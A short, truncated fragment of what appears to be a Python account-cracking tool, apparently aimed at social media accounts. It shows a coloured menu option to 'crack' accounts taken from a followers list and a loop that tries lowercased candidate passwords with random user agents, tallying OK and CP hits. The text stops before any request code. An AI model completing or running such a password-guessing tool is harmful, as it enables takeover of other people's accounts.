...
def menu():
    ...
    print(" \033[1;96m[\033[1;92m3\033[1;96m]\033[1;92m \033[1;97mCrack Dari Followers")
...
def api(uid, pwx):
	...
	sys.stdout.write(
		"\r\033[1;93m◍➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s  OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice([
